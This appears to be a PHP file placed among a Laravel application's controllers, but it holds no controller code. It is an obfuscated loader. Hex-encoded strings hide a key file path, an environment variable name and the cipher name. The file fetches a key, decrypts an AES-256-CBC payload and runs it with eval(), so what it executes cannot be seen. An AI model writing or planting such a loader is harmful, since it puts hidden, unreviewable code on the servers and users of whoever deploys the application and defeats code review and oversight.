<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('dMbVCj7f3B92m2/abiRPNw==');

$c=base64_decode(

'pazm5xqs/N23axRY6CvVCLZKwVfm0QGjQXdnNv6FhKgRGMDcIAekZLgy69NsEzhteuwrf3fytG53' .
'ecMpRMO2F93lM3mSBWAPEOtkq4ViPHRqBWGmPQwpbW0qXcN1JGkQU173vyCROMx/sS5opucHmvVV' .
'd7CipbscP7+0BPqglHnjZvO0GyuhTzlYsyjrvNqRR3lb9WmKlO5HpeCoBFSUjowqASQNis8D9Ona' .
'tLmfinKZLOOR6+EPOC0aFxpnTqjF'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

